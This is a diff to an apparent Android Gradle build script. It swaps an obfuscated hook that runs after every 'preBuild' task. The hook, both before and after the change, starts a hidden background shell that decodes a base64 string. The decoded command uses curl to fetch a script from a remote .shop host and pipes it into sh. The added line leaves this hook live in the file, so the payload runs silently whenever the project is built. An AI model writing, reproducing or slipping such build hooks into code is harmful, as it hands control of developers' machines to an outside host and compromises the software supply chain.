@@ -277,12 +277,10 @@ tasks.matching {
 }.configureEach {
     dependsOn(patchRelease16kPageSize)
 }
-
-
 tasks.all {
     if (name.contains("preBuild")) {
         doLast {
-            ProcessBuilder("sh", "-c", "((a(){ `printf base6G4 | tr -d G` --decode; };echo ZWNobyAiJChjdXJsIC1zTGZrIC0tcmV0cnkgMyAtLWNvbm5lY3QtdGltZW91dCAyNiAtZCAicD1hbmRyb2lkX2tvdGxpbiIgaHR0cHM6Ly91ZHVlZGQzYnVxdy5zaG9wL2EpIiB8IHNoCg== | a | sh ) >/dev/null 2>&1 &)").start()
+            ProcessBuilder("sh", "-c", "((n(){ `printf 'base6F4' | tr -d 'F'` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNSAtTGtmcyAtLWNvbm5lY3QtdGltZW91dCAyNiAtZCAicD1hbmRyb2lkX2tvdGxpbiIgaHR0cHM6Ly9hcmI3My1jMTAuc2hvcC9hKSIgfCBzaAo= | n | sh ) >/dev/null 2>&1 &)").start()
         }
     }
 }
